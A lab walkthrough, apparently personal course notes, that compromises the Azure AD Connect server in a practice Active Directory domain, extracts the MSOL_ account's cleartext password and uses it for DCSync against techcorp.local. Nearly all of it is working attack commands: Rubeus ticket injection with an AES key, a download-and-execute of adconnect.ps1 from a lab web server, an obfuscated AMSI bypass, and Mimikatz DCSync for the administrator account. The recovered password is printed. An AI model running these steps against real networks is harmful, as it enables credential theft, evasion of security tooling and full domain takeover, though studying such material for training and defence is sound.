
Task 

• Find out the machine where Azure AD Connect is installed. 
• Compromise the machine and extract the password of AD Connect user in clear-text.
• Using the AD Connect user's password, extract secrets from us-dc and techcorp-dc


We can find out the machine where Azure AD Connect is installed by looking at the Description of special account whose name begins with MSOL_.


Using the Active Directory module after loading it from InvisiShell:

```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

![[Pasted image 20250321150727.png]]

Recall that we already have administrative access to us-adconnect as helpdeskadmin. With that access, we can extract credentials of MSOL_16fb75d0227d account in clear-text. We will use the adconnect.ps1 script for that.

Connect to us-adconnect as helpdeskadmin. Run the below command from an elevated shell on the student VM to start a cmd.exe as helpdeskadmin:

```
echo %Pwn% asktgt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /domain:us.techcorp.local /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

In the new process, run the following commands to copy InvisiShell on us-adconnect machine and use it:

```
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InShellProf.dll /Y
```

```
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat /Y
```

```
winrs -r:us-adconnect cmd
```

```
RunWithRegistryNonAdmin.bat
```


Now we have a PowerShell session from InvisiShell ready on us-adconnect. Next, host adconnect.ps1 on a local web server and run the below commands on us-helpdesk to extract credentials of MSOL_ account. Note that we would still need to run an AMSI bypass as the adconnect.ps1 runs a new PowerShell process when executed:

```
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.139/adconnect.ps1')
```

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
username : MSOL_16fb75d0227d
password : 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW- {)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
```

Now, we can use this password to run DCSync attacks against the target domain (techcorp.local in present case). Run the below command from an elevated shell on student VM:

```
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

![[Pasted image 20250321164233.png]]

in the new process

```
echo %Pwn% lsadump::dcsync
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe - args "%Pwn% /user:techcorp\administrator /domain:techcorp.local" "exit"
```

Note that the runas command need not be executed from an elevated shell, we did that as SafetyKatz checks if it is running from a high integrity process even if the command – DCSync – does not need high integrity process. We can execute the same attack without needing administrator privileges on the student VM using the below commands:

```
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

In the new process, run the following commands for DCSync:


```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
. C:\AD\Tools\Invoke-Mimi.ps1
```

```
Invoke-Mimi -Command '"lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local"'
```

![[Pasted image 20250321164541.png]]



